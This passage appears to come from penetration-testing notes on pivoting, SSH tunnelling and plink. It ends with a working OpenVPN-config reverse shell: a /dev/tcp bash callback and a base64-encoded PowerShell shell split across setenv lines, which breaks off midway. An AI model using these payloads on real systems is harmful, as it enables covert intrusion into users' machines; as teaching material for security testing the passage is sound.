<span class="go">-encode Encode a file to Base64</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Now, we can execute the file (assuming powershell ps1 file) to get the full powershell ICMP reverse shell with buffer management so, we would be able to get full output of the commands.</p></li>
<li><p>Now, most of the time after getting the intial shell, probably, we would have figured out user credentials ( let’s say from www-data or iisapppool user to normal/ admin user credentials. ) At this point of time, we can use the below code to create a PSCredential.</p></li>
</ul>
<blockquote>
<div><div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$username</span> <span class="p">=</span> <span class="s1">&#39;UsernameHere&#39;</span><span class="p">;</span>
<span class="nv">$password</span> <span class="p">=</span> <span class="s1">&#39;PasswordHere&#39;</span><span class="p">;</span>
<span class="nv">$securePassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$password</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span>
<span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$securePassword</span>
</pre></div>
</div>
</div></blockquote>
<ul>
<li><p>Once, we have created a PSCredential, we can use <a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command">Invoke-Command</a>  to execute command as that user.</p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">localhost</span> <span class="n">-Credential</span> <span class="nv">$credential</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="n">Command</span> <span class="n">to</span> <span class="n">be</span> <span class="n">executed</span><span class="p">}</span>
<span class="n">-ComputerName</span> <span class="n">localhost</span> <span class="n">is</span> <span class="n">required</span> <span class="n">as</span> <span class="n">the</span> <span class="n">code</span> <span class="n">is</span> <span class="n">to</span> <span class="n">be</span> <span class="n">executed</span> <span class="n">on</span> <span class="n">localhost</span><span class="p">,</span> <span class="n">without</span> <span class="n">-ComputerName</span><span class="p">,</span> <span class="n">InvokeCommand</span> <span class="n">doesn</span><span class="err">&#39;</span><span class="n">t</span> <span class="n">work</span><span class="p">.</span>
</pre></div>
</div>
</li>
<li><p>Possibly, we can execute the ICMP Shell code to get the shell as the new user.</p></li>
<li><p>One problem, which we gonna face is, when we are running ICMP Shell with different users for example, first with IISWebpool, then with User1, then with user2, we would get multple times IISWebpool as that powershell process (on UDP) is still running. One way to this is Just before launching a new ICMP shell as a different user.</p>
<ul class="simple">
<li><p>Check powershell processes with Show-Process</p></li>
</ul>
<blockquote>
<div><div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Show-Process</span> <span class="n">-Name</span> <span class="p">*</span><span class="n">power</span><span class="p">*</span> <span class="s2">&quot;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Note down  the PID</p></li>
<li><p>Execute shell as the different user</p></li>
<li><p>Stop-Process the previous PID</p></li>
</ul>
</li>
</ul>
</section>
<section id="ssh-tunneling">
<h3>SSH Tunneling<a class="headerlink" href="#ssh-tunneling" title="Link to this heading"></a></h3>
<p>SSH protocol, which supports bi-directional communication channels can create encrypted tunnels.</p>
<section id="local-port-forwarding">
<h4>Local Port Forwarding<a class="headerlink" href="#local-port-forwarding" title="Link to this heading"></a></h4>
<p>SSH local port forwarding allows us to tunnel a local port to a remote server, using SSH as the transport protocol.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="n">sshserver</span> <span class="o">-</span><span class="n">L</span> <span class="o">&lt;</span><span class="n">local</span> <span class="n">port</span> <span class="n">to</span> <span class="n">listen</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">remote</span> <span class="n">host</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">remote</span> <span class="n">port</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>Example:</p>
<p>Imagine we’re on a private network which doesn’t allow connections to a specific server. Let’s say you’re at work and youtube is being blocked. To get around this we can create a tunnel through a server which isn’t on our network and thus can access Youtube.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ ssh -L 9000:imgur.com:80 user@example.com
</pre></div>
</div>
<p>The key here is -L which says we’re doing local port forwarding. Then it says we’re forwarding our local port 9000 to youtube.com:80, which is the default port for HTTP. Now open your browser and go to http://localhost:9000</p>
<p><strong>Syntax</strong></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>-L [bind_address:]port:host:hostport
-L [bind_address:]port:remote_socket
-L local_socket:host:hostport
-L local_socket:remote_socket
        Specifies that connections to the given TCP port or Unix socket on the local (client) host are to be forwarded to the given host and port, or Unix socket, on the remote side.  This works by allocating a socket to listen to either a TCP port on
        the local side, optionally bound to the specified bind_address, or to a Unix socket.  Whenever a connection is made to the local port or socket, the connection is forwarded over the secure channel, and a connection is made to either host port
        hostport, or the Unix socket remote_socket, from the remote machine.

        Port forwardings can also be specified in the configuration file.  Only the superuser can forward privileged ports.  IPv6 addresses can be specified by enclosing the address in square brackets.

        By default, the local port is bound in accordance with the GatewayPorts setting.  However, an explicit bind_address may be used to bind the connection to a specific address.  The bind_address of “localhost” indicates that the listening port be
        bound for local use only, while an empty address or ‘*’ indicates that the port should be available from all interfaces.
</pre></div>
</div>
<p>To share a interesting case, Let’s say there’s a host which is running port 22 on all interfaces and port 8080 and 8081 (or any other port) on local loopback interface (127.0.0.1), something like</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">tcp4</span>       <span class="mi">0</span>      <span class="mi">0</span> <span class="o">*.</span><span class="n">ssh</span>                  <span class="o">*.*</span>                    <span class="n">LISTEN</span>
<span class="n">tcp6</span>       <span class="mi">0</span>      <span class="mi">0</span> <span class="o">*.</span><span class="n">ssh</span>                  <span class="o">*.*</span>                    <span class="n">LISTEN</span>
<span class="n">tcp4</span>       <span class="mi">0</span>      <span class="mi">0</span> <span class="n">localhost</span><span class="mf">.8080</span>         <span class="o">*.*</span>                    <span class="n">LISTEN</span>
<span class="n">tcp4</span>       <span class="mi">0</span>      <span class="mi">0</span> <span class="n">localhost</span><span class="mf">.8081</span>         <span class="o">*.*</span>                    <span class="n">LISTEN</span>
</pre></div>
</div>
<p>Now, webserver on port 8080 and 8081 are running on localhost, if we have ssh access to the machine, we can tunnel them via local port forwarding and run it on the ethernet interface.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="o">-</span><span class="n">L</span> <span class="n">IP_Address_of_Machine</span><span class="p">:</span><span class="o">&lt;</span><span class="n">Port</span><span class="o">-</span><span class="n">which</span><span class="o">-</span><span class="n">we</span><span class="o">-</span><span class="n">want</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="nb">open</span><span class="o">-</span><span class="n">Let</span><span class="s1">&#39;s say-9000&gt;:127.0.0.1:&lt;localhost-port-which-we-want-to-map-let&#39;</span><span class="n">s</span><span class="o">-</span><span class="n">say</span><span class="o">-</span><span class="mi">8080</span><span class="o">&gt;</span> <span class="n">user</span><span class="nd">@IP_Address_of_Machine</span>
</pre></div>
</div>
<p>It would become</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="o">-</span><span class="n">L</span> <span class="mf">10.10.10.10</span><span class="p">:</span><span class="mi">9000</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">8080</span> <span class="n">user</span><span class="o">@</span><span class="mf">10.10.10.10</span> <span class="ow">and</span>
<span class="n">ssh</span> <span class="o">-</span><span class="n">L</span> <span class="mf">10.10.10.10</span><span class="p">:</span><span class="mi">9001</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">8081</span> <span class="n">user</span><span class="o">@</span><span class="mf">10.10.10.10</span>
</pre></div>
</div>
<p>The above would open port 9000 and 9001 (on the external interface) and map it to port 8080 and 8081(which were running on local/ loopback interface).</p>
</section>
<section id="remote-port-forwarding">
<h4>Remote Port Forwarding<a class="headerlink" href="#remote-port-forwarding" title="Link to this heading"></a></h4>
<p>SSH remote port forwarding allows us to tunnel a remote port to a local server.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="n">sshserver</span> <span class="o">-</span><span class="n">R</span> <span class="o">&lt;</span><span class="n">remote</span> <span class="n">port</span> <span class="n">to</span> <span class="n">bind</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">local</span> <span class="n">host</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">local</span> <span class="n">port</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>Example:</p>
<p>Let’s say there’s a wordpress web-application we have compromised and have a www-data shell. Also, let’s say, we are inside a docker environment with the network below</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mf">172.16.0.1</span> <span class="n">Host</span><span class="o">-</span><span class="n">Machine</span>
<span class="mf">172.16.0.2</span> <span class="n">WordPress</span>
<span class="mf">172.16.0.3</span> <span class="n">Joomla</span>
<span class="mf">172.16.0.4</span> <span class="n">Mysql</span>
</pre></div>
</div>
<p>Now, Let’s say, we have root credentials of mysql and want to access it using dbeaver application. Now, as we have access of wordpress machine, we can basically ssh to our machine (Let’s say our IP is 10.10.15.111), creating a Remote Port Forward</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="n">bitvijays</span><span class="o">@</span><span class="mf">10.10.15.111</span> <span class="o">-</span><span class="n">R</span> <span class="mi">3306</span><span class="p">:</span><span class="mf">172.16.0.4</span><span class="p">:</span><span class="mi">3306</span>
</pre></div>
</div>
<p>The above would create a ssh tunnel between 10.10.15.111:3306 and 172.16.0.4:3306. Then, we would be able to just launch dbeaver and connect to localhost mysql and browse the database at 172.16.0.4:3306.</p>
<p>As we would be probably inside the docker and www-data user, we might not have ssh binary and proper environment variable in that case, we can add below options</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">./</span><span class="n">ssh</span> <span class="o">-</span><span class="n">o</span> <span class="n">StrictHostKeyChecking</span><span class="o">=</span><span class="n">no</span> <span class="o">-</span><span class="n">o</span> <span class="n">UserKnownHostsFile</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">o</span> <span class="n">GlobalKnownHostsFile</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">i</span> <span class="n">id_rsa</span> <span class="o">-</span><span class="n">R</span> <span class="mi">3306</span><span class="p">:</span><span class="mf">172.16.0.4</span><span class="p">:</span><span class="mi">3306</span> <span class="o">-</span><span class="n">fN</span> <span class="n">bitvijays</span><span class="o">@</span><span class="mf">10.10.15.111</span>
</pre></div>
</div>
</section>
<section id="ssh-as-socks-proxy">
<h4>SSH as SOCKS Proxy<a class="headerlink" href="#ssh-as-socks-proxy" title="Link to this heading"></a></h4>
<p>We can use ssh to have a socks proxy to connect to vnc, ssh, rdp if vm is hosting in another vm and then use remmina to access VNC.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ssh -D localhost:9050 user@host

-D [bind_address:]port Specifies a local “dynamic” application-level port forwarding.  This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address.  Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine.  Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file.
</pre></div>
</div>
<p>and</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">proxychains4</span> <span class="n">remmina</span><span class="o">/</span> <span class="n">rdesktop</span>
</pre></div>
</div>
</section>
<section id="vpn-like-tunnelling">
<h4>VPN-like tunnelling?<a class="headerlink" href="#vpn-like-tunnelling" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://github.com/sshuttle/sshuttle">sshuttle</a> Transparent proxy server that works as a poor man’s VPN. Forwards over ssh. Doesn’t require admin. Works with Linux and MacOS. Supports DNS tunneling.</p>
<p>So if we have a access to device at 10.1.1.1, and it also has an interface on 192.168.122.0/24 with other hosts behind it, we can run:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1"># sshuttle -r root@10.1.1.1 192.168.122.0/24</span>
<span class="n">root</span><span class="o">@</span><span class="mf">10.1.1.1</span><span class="s1">&#39;s password:</span>
<span class="n">client</span><span class="p">:</span> <span class="n">Connected</span><span class="o">.</span>
</pre></div>
</div>
<p>This creates a VPN-like connection, allowing me to visit 192.168.122.4 in a browser or with curl, and see the result.</p>
<p>Probably, nmap won’t be a good idea to run over sshuttle, however, it is a very nice way to interact with a host over a tunnel.</p>
</section>
<section id="scp">
<h4>SCP<a class="headerlink" href="#scp" title="Link to this heading"></a></h4>
<p>To copy all from Local Location to Remote Location (Upload)</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">scp</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">from</span><span class="o">/</span><span class="n">destination</span> <span class="n">username</span><span class="nd">@hostname</span><span class="p">:</span><span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">destination</span>
</pre></div>
</div>
<p>To copy all from Remote Location to Local Location (Download)</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">scp</span> <span class="o">-</span><span class="n">r</span> <span class="n">username</span><span class="nd">@hostname</span><span class="p">:</span><span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">from</span><span class="o">/</span><span class="n">destination</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">destination</span>
</pre></div>
</div>
<p>Help:</p>
<ul class="simple">
<li><p>-r Recursively copy all directories and files</p></li>
<li><p>Always use full location from /, Get full location by pwd</p></li>
<li><p>scp will replace all existing files</p></li>
<li><p>hostname will be hostname or IP address</p></li>
<li><p>If custom port is needed (besides port 22) use -P portnumber</p></li>
<li><p>. (dot) - it means current working directory, So download/copy from server and paste here only.</p></li>
</ul>
</section>
</section>
<section id="plink">
<h3>Plink<a class="headerlink" href="#plink" title="Link to this heading"></a></h3>
<p>Plink is a windows command-line connection tool similar to UNIX ssh.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">plink</span>
<span class="n">Plink</span><span class="p">:</span> <span class="n">command</span><span class="o">-</span><span class="n">line</span> <span class="n">connection</span> <span class="n">utility</span>
<span class="n">Release</span> <span class="mf">0.68</span>
<span class="n">Usage</span><span class="p">:</span> <span class="n">plink</span> <span class="p">[</span><span class="n">options</span><span class="p">]</span> <span class="p">[</span><span class="n">user</span><span class="o">@</span><span class="p">]</span><span class="n">host</span> <span class="p">[</span><span class="n">command</span><span class="p">]</span>
      <span class="p">(</span><span class="s2">&quot;host&quot;</span> <span class="n">can</span> <span class="n">also</span> <span class="n">be</span> <span class="n">a</span> <span class="n">PuTTY</span> <span class="n">saved</span> <span class="n">session</span> <span class="n">name</span><span class="p">)</span>
<span class="n">Options</span><span class="p">:</span>
 <span class="o">-</span><span class="n">V</span>        <span class="nb">print</span> <span class="n">version</span> <span class="n">information</span> <span class="ow">and</span> <span class="n">exit</span>
 <span class="o">-</span><span class="n">v</span>        <span class="n">show</span> <span class="n">verbose</span> <span class="n">messages</span>
 <span class="o">-</span><span class="n">load</span> <span class="n">sessname</span>  <span class="n">Load</span> <span class="n">settings</span> <span class="kn">from</span> <span class="nn">saved</span> <span class="n">session</span>
 <span class="o">-</span><span class="n">ssh</span> <span class="o">-</span><span class="n">telnet</span> <span class="o">-</span><span class="n">rlogin</span> <span class="o">-</span><span class="n">raw</span> <span class="o">-</span><span class="n">serial</span>
           <span class="n">force</span> <span class="n">use</span> <span class="n">of</span> <span class="n">a</span> <span class="n">particular</span> <span class="n">protocol</span>
 <span class="o">-</span><span class="n">P</span> <span class="n">port</span>   <span class="n">connect</span> <span class="n">to</span> <span class="n">specified</span> <span class="n">port</span>
 <span class="o">-</span><span class="n">l</span> <span class="n">user</span>   <span class="n">connect</span> <span class="k">with</span> <span class="n">specified</span> <span class="n">username</span>
<span class="n">The</span> <span class="n">following</span> <span class="n">options</span> <span class="n">only</span> <span class="n">apply</span> <span class="n">to</span> <span class="n">SSH</span> <span class="n">connections</span><span class="p">:</span>
 <span class="o">-</span><span class="n">pw</span> <span class="n">passw</span> <span class="n">login</span> <span class="k">with</span> <span class="n">specified</span> <span class="n">password</span>
 <span class="o">-</span><span class="n">D</span> <span class="p">[</span><span class="n">listen</span><span class="o">-</span><span class="n">IP</span><span class="p">:]</span><span class="n">listen</span><span class="o">-</span><span class="n">port</span>
           <span class="n">Dynamic</span> <span class="n">SOCKS</span><span class="o">-</span><span class="n">based</span> <span class="n">port</span> <span class="n">forwarding</span>
 <span class="o">-</span><span class="n">L</span> <span class="p">[</span><span class="n">listen</span><span class="o">-</span><span class="n">IP</span><span class="p">:]</span><span class="n">listen</span><span class="o">-</span><span class="n">port</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span>
           <span class="n">Forward</span> <span class="n">local</span> <span class="n">port</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">address</span>
 <span class="o">-</span><span class="n">R</span> <span class="p">[</span><span class="n">listen</span><span class="o">-</span><span class="n">IP</span><span class="p">:]</span><span class="n">listen</span><span class="o">-</span><span class="n">port</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span>
           <span class="n">Forward</span> <span class="n">remote</span> <span class="n">port</span> <span class="n">to</span> <span class="n">local</span> <span class="n">address</span>
 <span class="o">-</span><span class="n">X</span> <span class="o">-</span><span class="n">x</span>     <span class="n">enable</span> <span class="o">/</span> <span class="n">disable</span> <span class="n">X11</span> <span class="n">forwarding</span>
 <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">a</span>     <span class="n">enable</span> <span class="o">/</span> <span class="n">disable</span> <span class="n">agent</span> <span class="n">forwarding</span>
 <span class="o">-</span><span class="n">t</span> <span class="o">-</span><span class="n">T</span>     <span class="n">enable</span> <span class="o">/</span> <span class="n">disable</span> <span class="n">pty</span> <span class="n">allocation</span>
 <span class="o">-</span><span class="n">C</span>        <span class="n">enable</span> <span class="n">compression</span>
 <span class="o">-</span><span class="n">i</span> <span class="n">key</span>    <span class="n">private</span> <span class="n">key</span> <span class="n">file</span> <span class="k">for</span> <span class="n">user</span> <span class="n">authentication</span>
 <span class="o">-</span><span class="n">m</span> <span class="n">file</span>   <span class="n">read</span> <span class="n">remote</span> <span class="n">command</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="kn">from</span> <span class="nn">file</span>
 <span class="o">-</span><span class="n">N</span>        <span class="n">don</span><span class="s1">&#39;t start a shell/command (SSH-2 only)</span>
 <span class="o">-</span><span class="n">nc</span> <span class="n">host</span><span class="p">:</span><span class="n">port</span>
           <span class="nb">open</span> <span class="n">tunnel</span> <span class="ow">in</span> <span class="n">place</span> <span class="n">of</span> <span class="n">session</span> <span class="p">(</span><span class="n">SSH</span><span class="o">-</span><span class="mi">2</span> <span class="n">only</span><span class="p">)</span>
</pre></div>
</div>
<p>It can also be used to perform SSH tunnelling, have a look at -L, -R and -D options. On Kali Linux box it is present at /usr/share/windows-binaries/plink.exe</p>
</section>
<section id="openvpn-configuration-file-reverse-shell">
<h3>OpenVPN Configuration File Reverse Shell?<a class="headerlink" href="#openvpn-configuration-file-reverse-shell" title="Link to this heading"></a></h3>
<p>Taken from <a class="reference external" href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da">Reverse Shell from an OpenVPN Configuration File</a></p>
<p>An ovpn file is a configuration file provided to the OpenVPN client or server. The file details everything about the VPN connection: which remote servers to connect to, the crypto to use, which protocols, the user to login as, etc.</p>
<p>At its most simple form, an ovpn file looks like the this:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">remote</span> <span class="mf">192.168.1.245</span>
<span class="n">ifconfig</span> <span class="mf">10.200.0.2</span> <span class="mf">10.200.0.1</span>
<span class="n">dev</span> <span class="n">tun</span>
</pre></div>
</div>
<p>This directs the client to connect to the server at 192.168.1.245 without authentication or encryption and establish the tun interface for communication between the client (10.200.0.2) and the server (10.200.0.1).</p>
<p>The OpenVPN configuration feature is important is the up command. This is how the manual describes it:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Run command cmd after successful TUN/TAP device open (pre — user UID change).
cmd consists of a path to script (or executable program), optionally followed by arguments. The path and arguments may be single- or double-quoted and/or escaped using a backslash, and should be separated by one or more spaces.
</pre></div>
</div>
<p>Basically, the up command will execute any binary of script you point it to</p>
<section id="linux">
<h4>Linux<a class="headerlink" href="#linux" title="Link to this heading"></a></h4>
<p>If the victim is using a version of Bash that supports /dev/tcp then getting a reverse shell is trivial. The following ovpn file will background a reverse shell to 192.168.1.218:8181.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">remote</span> <span class="mf">192.168.1.245</span>
<span class="n">ifconfig</span> <span class="mf">10.200.0.2</span> <span class="mf">10.200.0.1</span>
<span class="n">dev</span> <span class="n">tun</span>
<span class="n">script</span><span class="o">-</span><span class="n">security</span> <span class="mi">2</span>
<span class="n">up</span> <span class="s2">&quot;/bin/bash -c &#39;/bin/bash -i &gt; /dev/tcp/192.168.1.218/8181 0&lt;&amp;1 2&gt;&amp;1 &amp;&#39;&quot;</span>
</pre></div>
</div>
<p>When this ovpn file is used it won’t be obvious to the user that something is wrong. The VPN connection is established normally and traffic flows. There are only two indications in the log that perhaps something is afoot.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Thu Jun 7 12:28:23 2018 NOTE: the current — script-security setting may allow this configuration to call user-defined scripts
Thu Jun 7 12:28:23 2018 ******* WARNING *******: All encryption and authentication features disabled — All data will be tunnelled as clear text and will not be protected against man-in-the-middle changes. PLEASE DO RECONSIDER THIS CONFIGURATION!
</pre></div>
</div>
<p>Even if the the user does see these log entries a reverse shell has already been established with our listener on 192.168.1.218:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>albinolobster@ubuntu:~$ nc -lvp 8181
Listening on [0.0.0.0] (family 0, port 8181)
Connection from [192.168.1.247] port 8181 [tcp/*] accepted (family 2, sport 54836)
root@client:/home/client/openvpn# id
id
uid=0(root) gid=0(root) groups=0(root)
</pre></div>
</div>
</section>
<section id="windows">
<h4>Windows<a class="headerlink" href="#windows" title="Link to this heading"></a></h4>
<p>Windows doesn’t have an analogous /dev/tcp feature. We’ll have to work a little harder to generate a reverse shell from a Windows host.</p>
<p>Fortunately, Dave Kennedy of TrustedSec wrote a small <a class="reference external" href="https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/reverse.powershell">powershell reverse shell</a> that we can use. Using powershell.exe’s -EncodedCommand
parameter we can pass the entire script on the command line. First, however, we’ll need to base64 encode the script to avoid having to insert escapes. Our old friend Carlos Perez has a script called <a class="reference external" href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py">ps_encoder.py</a>
that will do the encoding for us.</p>
<p>However, there is a problem. The encoded reverse shell script is over 4000 characters long and OpenVPN has a 256 character limitation. To get around this we can use the setenv command to split up the script and then recombine it in the up command. Consider the following ovpn file:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ifconfig 10.200.0.2 10.200.0.1
dev tun
remote 192.168.1.245
script-security 2
setenv z1 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
setenv a1 ‘ZgB1AG4AYwB0AGkAbwBuACAAYwBsAGUAYQBuAHUAcAAgAHsADQAKAGkAZgAgACgAJABjAGwAaQBlAG4AdAAuAEMAbwBuAG4AZQBjAHQAZQBkACAALQBlAHEAIAAkAHQAcgB1AGUAKQAgAHsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAfQANAAoAaQBmACAAKAAkAHAAcgBvAGMAZQBzAHMALgBFAHgAaQB0AEM’
setenv b1 ‘AbwBkAGUAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewAkAHAAcgBvAGMAZQBzAHMALgBDAGwAbwBzAGUAKAApAH0ADQAKAGUAeABpAHQAfQANAAoAJABhAGQAZAByAGUAcwBzACAAPQAgACcAMQA5ADIALgAxADYAOAAuADEALgAyADEAOAAnAA0ACgAkAHAAbwByAHQAIAA9ACAAJwA4ADEAOAAxACcADQAKACQAYwBsAG’
setenv c1 ‘kAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgBzAG8AYwBrAGUAdABzAC4AdABjAHAAYwBsAGkAZQBuAHQADQAKACQAYwBsAGkAZQBuAHQALgBjAG8AbgBuAGUAYwB0ACgAJABhAGQAZAByAGUAcwBzACwAJABwAG8AcgB0ACkADQAKACQAcwB0AHIAZQBhAG0AIAA9A’
setenv d1 ‘CAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQANAAoAJABuAGUAdAB3AG8AcgBrAGIAdQBmAGYAZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEIAeQB0AGUAWwBdACAAJABjAGwAaQBlAG4AdAAuAFIAZQBjAGUAaQB2AGUAQgB1AGYAZgBlAHIAUwBpAHoAZQAN’
setenv e1 ‘AAoAJABwAHIAbwBjAGUAcwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMADQAKACQAcAByAG8AYwBlAHMAcwAuAFMAdABhAHIAdABJAG4AZgBvAC4ARgBpAGwAZQBOAGEAbQBlACAAPQAgACcAQwA6AFwAXAB3AGkAbgB’
setenv f1 ‘kAG8AdwBzAFwAXABzAHkAcwB0AGUAbQAzADIAXABcAGMAbQBkAC4AZQB4AGUAJwANAAoAJABwAHIAbwBjAGUAcwBzAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAEkAbgBwAHUAdAAgAD0AIAAxAA0ACgAkAHAAcgBvAGMAZQBzAHMALgBTAHQAYQByAHQASQBuAGYAbw’
setenv g1 ‘AuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAIAA9ACAAMQANAAoAJABwAHIAbwBjAGUAcwBzAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQAgAD0AIAAwAA0ACgAkAHAAcgBvAGMAZQBzAHMALgBTAHQAYQByAHQAKAApAA0ACgAkAGkAb’
setenv h1 ‘gBwAHUAdABzAHQAcgBlAGEAbQAgAD0AIAAkAHAAcgBvAGMAZQBzAHMALgBTAHQAYQBuAGQAYQByAGQASQBuAHAAdQB0AA0ACgAkAG8AdQB0AHAAdQB0AHMAdAByAGUAYQBtACAAPQAgACQAcAByAG8AYwBlAHMAcwAuAFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAANAAoAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAA’
setenv i1 ‘MQANAAoAJABlAG4AYwBvAGQAaQBuAGcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAcwBjAGkAaQBFAG4AYwBvAGQAaQBuAGcADQAKAHcAaABpAGwAZQAoACQAbwB1AHQAcAB1AHQAcwB0AHIAZQBhAG0ALgBQAGUAZQBrACgAKQAgAC0AbgBlACAALQAxACkAewAkAG8’
setenv j1 ‘AdQB0ACAAKwA9ACAAJABlAG4AYwBvAGQAaQBuAGcALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAbwB1AHQAcAB1AHQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAKQApAH0ADQAKACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAGUAbgBjAG8AZABpAG4AZwAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbwB1AHQAKQAsAD’
setenv k1 ‘AALAAkAG8AdQB0AC4ATABlAG4AZwB0AGgAKQANAAoAJABvAHUAdAAgAD0AIAAkAG4AdQBsAGwAOwAgACQAZABvAG4AZQAgAD0AIAAkAGYAYQBsAHMAZQA7ACAAJAB0AGUAcwB0AGkAbgBnACAAPQAgADAAOwANAAoAdwBoAGkAbABlACAAKAAtAG4AbwB0ACAAJABkAG8AbgBlACkAIAB7AA0ACgBpAGYAIAAoACQAYwBsA’
setenv l1 ‘GkAZQBuAHQALgBDAG8AbgBuAGUAYwB0AGUAZAAgAC0AbgBlACAAJAB0AHIAdQBlACkAIAB7AGMAbABlAGEAbgB1AHAAfQANAAoAJABwAG8AcwAgAD0AIAAwADsAIAAkAGkAIAA9ACAAMQANAAoAdwBoAGkAbABlACAAKAAoACQAaQAgAC0AZwB0ACAAMAApACAALQBhAG4AZAAgACgAJABwAG8AcwAgAC0AbAB0ACAAJABu’
